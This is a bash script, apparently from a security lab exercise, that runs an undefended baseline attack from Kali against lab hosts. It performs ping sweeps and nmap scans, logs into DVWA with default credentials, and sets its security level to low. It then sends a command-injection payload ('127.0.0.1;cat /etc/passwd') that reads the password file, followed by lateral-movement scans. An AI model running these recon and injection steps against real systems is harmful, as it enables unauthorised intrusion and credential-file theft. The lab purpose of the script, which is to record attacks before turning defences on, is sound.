#!/bin/bash
# run-full-attack.sh
# Executes all undefended attack scenarios from Kali in sequence.
# Run BEFORE enabling defenses to capture baseline evidence.

EVIDENCE_DIR="/evidence/attack"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
TARGET="http://192.168.20.10"
COOKIE_JAR="/tmp/dvwa-cookies-$TIMESTAMP.txt"
RESPONSE_HEADERS="/tmp/dvwa-response-$TIMESTAMP.headers"
cleanup_dvwa_session() {
    rm -f "$COOKIE_JAR" "$RESPONSE_HEADERS"
}
trap cleanup_dvwa_session EXIT

# Extract DVWA's anti-CSRF token from a page rendered for the current session.
get_user_token() {
    printf '%s' "$1" | grep -o "user_token' value='[^']*" | sed "s/.*value='//"
}

# Log in and return 2 only when DVWA explicitly redirects to first-run setup.
login_to_dvwa() {
    local login_page login_token

    login_page=$(curl -fsS -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$TARGET/login.php") || return 1
    login_token=$(get_user_token "$login_page")
    if [ -z "$login_token" ]; then
        echo "[ERROR] Could not read the DVWA login token." >&2
        return 1
    fi

    curl -sS -D "$RESPONSE_HEADERS" -o /dev/null \
        -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
        --data-urlencode "username=admin" \
        --data-urlencode "password=password" \
        --data-urlencode "Login=Login" \
        --data-urlencode "user_token=$login_token" \
        "$TARGET/login.php" || return 1

    if grep -qiE '^Location:.*setup\.php' "$RESPONSE_HEADERS"; then
        return 2
    fi
    if grep -qiE '^Location:.*/?index\.php' "$RESPONSE_HEADERS"; then
        return 0
    fi

    echo "[ERROR] DVWA login failed; check the lab credentials and database." >&2
    return 1
}

# Initialize only a database DVWA reports as missing. DVWA's setup button
# resets an existing database, so require explicit opt-in before submitting it.
initialize_dvwa_database() {
    local setup_page setup_token

    if [ "${DVWA_SETUP_DB:-0}" != "1" ]; then
        echo "[ERROR] DVWA database is not initialized." >&2
        echo "Run the one-time setup at http://localhost:8080/setup.php, then rerun this script." >&2
        echo "Or set DVWA_SETUP_DB=1 to let this script create/reset the lab database." >&2
        return 1
    fi

    setup_page=$(curl -fsS -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$TARGET/setup.php") || return 1
    setup_token=$(get_user_token "$setup_page")
    if [ -z "$setup_token" ]; then
        echo "[ERROR] Could not read the DVWA setup token." >&2
        return 1
    fi

    echo "[SETUP] Initializing the DVWA database (setup.php resets existing DVWA data)."
    curl -fsS -o /dev/null -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
        --data-urlencode "create_db=Create / Reset Database" \
        --data-urlencode "user_token=$setup_token" \
        "$TARGET/setup.php"
}

echo "============================================="
echo " SwagPc Café — Undefended Attack Sequence"
echo " Timestamp: $TIMESTAMP"
echo "============================================="

mkdir -p "$EVIDENCE_DIR"

# ─── ATTACK 1: Network Reconnaissance ─────────────────────────────
echo ""
echo "[ATTACK 1] Network Reconnaissance from Guest (192.168.10.50)"
echo "Target: Business Subnet 192.168.20.0/24"

# Add route via firewall router
ip route add 192.168.20.0/24 via 192.168.10.254 2>/dev/null || true

echo "--- Ping Sweep ---"
ping -c 3 192.168.20.10 | tee "$EVIDENCE_DIR/ping-dvwa-$TIMESTAMP.txt"
ping -c 3 192.168.20.25 | tee "$EVIDENCE_DIR/ping-workstation-$TIMESTAMP.txt"

echo ""
echo "--- Nmap Port Scan ---"
nmap -sV -p 22,80,443,445,3389,8080 192.168.20.0/24 | tee "$EVIDENCE_DIR/nmap-scan-$TIMESTAMP.txt"

# ─── ATTACK 2: Web Exploitation ───────────────────────────────────
echo ""
echo "[ATTACK 2] DVWA Web Application Exploitation"
echo "Target: $TARGET"

echo "--- HTTP Reachability ---"
curl -sv "$TARGET" 2>&1 | tee "$EVIDENCE_DIR/http-reach-$TIMESTAMP.txt" | head -n 20

echo ""
echo "--- Command Injection Payload ---"
if login_to_dvwa; then
    :
else
    LOGIN_STATUS=$?
    if [ "$LOGIN_STATUS" -ne 2 ]; then
        exit "$LOGIN_STATUS"
    fi

    initialize_dvwa_database || exit 1
    rm -f "$COOKIE_JAR"
    login_to_dvwa || exit 1
fi

# Set the DVWA security level using its authenticated form and current CSRF token.
SECURITY_PAGE=$(curl -fsS -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$TARGET/security.php") || exit 1
SECURITY_TOKEN=$(get_user_token "$SECURITY_PAGE")
if [ -z "$SECURITY_TOKEN" ]; then
    echo "[ERROR] Could not read the DVWA security-level token." >&2
    exit 1
fi
curl -fsS -D "$RESPONSE_HEADERS" -o /dev/null \
    -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    --data-urlencode "security=low" \
    --data-urlencode "seclev_submit=Submit" \
    --data-urlencode "user_token=$SECURITY_TOKEN" \
    "$TARGET/security.php" || exit 1
echo "DVWA security level set to low for the undefended baseline."
if ! awk '$6 == "security" && $7 == "low" { found=1 } END { exit !found }' "$COOKIE_JAR"; then
    echo "[ERROR] DVWA did not return the expected security=low cookie." >&2
    exit 1
fi

CMDI_RESPONSE=$(curl -sS -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
     --data-urlencode "ip=127.0.0.1;cat /etc/passwd" \
     --data-urlencode "Submit=Submit" \
     "$TARGET/vulnerabilities/exec/") || exit 1
printf '%s\n' "$CMDI_RESPONSE" | tee "$EVIDENCE_DIR/cmdi-result-$TIMESTAMP.txt"
if ! printf '%s\n' "$CMDI_RESPONSE" | grep -qE 'root:[^:]*:0:0:'; then
    echo "[ERROR] Command injection returned no /etc/passwd content; see the evidence file above." >&2
    exit 1
fi

# ─── ATTACK 3: Lateral Movement ───────────────────────────────────
echo ""
echo "[ATTACK 3] Lateral Movement — reaching Employee Workstation"
echo "Target: 192.168.20.25"

echo "--- Ping ---"
ping -c 3 192.168.20.25 | tee "$EVIDENCE_DIR/lateral-ping-$TIMESTAMP.txt"

echo "--- Port scan of workstation ---"
nmap -sV -p 22,80,445,3389 192.168.20.25 | tee "$EVIDENCE_DIR/lateral-nmap-$TIMESTAMP.txt"

echo ""
echo "============================================="
echo " All attack evidence saved to $EVIDENCE_DIR"
echo " Review files in evidence/attack/ directory"
echo "============================================="
